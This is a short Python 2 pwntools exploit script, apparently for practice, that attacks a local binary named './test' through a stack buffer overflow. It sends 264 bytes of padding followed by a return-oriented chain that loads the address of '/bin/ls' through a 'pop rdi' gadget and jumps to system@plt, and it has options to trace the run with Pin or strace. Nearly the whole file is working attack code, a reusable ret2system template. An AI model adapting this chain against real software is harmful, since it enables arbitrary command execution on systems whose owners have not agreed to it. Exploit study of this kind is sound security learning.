#!/usr/bin/python2
from pwn import *
import sys

FILENAME = "./test"
elf = ELF(FILENAME)

def set_rdi(rdi):
	return "".join([
		p64(elf.address + 0x7d3), # ('pop rdi', 'ret') --> ['0x7d3']
		p64(rdi),
	])

def go():
    if "trace" in sys.argv:
        cmd = ("/home/jofra/Documents/tools/pin-3.16/pin -t /home/jofra/Documents/tools/pin-3.16/source/tools/ManualExamples/obj-intel64/zzz_jofra_trace_instructions.so -- " + FILENAME).split(" ")
    elif "strace" in sys.argv:
        cmd = ("strace -f " + FILENAME).split(" ")
    else:
        cmd = FILENAME

    s = process(cmd)
    if "wait" in sys.argv:
        raw_input("Enter any key to continue...")

    # ====================
    # leak
    # s.recvuntil("'main' leak @ ")
    # main_leak = int(s.recvline().strip(), 16)
    # elf.address = main_leak - elf.symbols['main']
    elf.address = 0x555555554000
    print "      elf.address @", hex(elf.address)
    print "elf.plt['system'] @", hex(elf.plt['system'])

    # ====================
    # overflow
    # With a odd amount of ret's between set_rdi and system we see the 'ls'.
    # Otherwise 'ls' does not run
    ROP = "".join([
        set_rdi(next(elf.search("/bin/ls"))),
        # p64(elf.address + 0x762), # ret
        p64(elf.plt['system']),
        p64(0xdeadbeef),
    ])
    payload = "A"*(256+8) + ROP
    s.sendline(payload)

    s.interactive()


go()
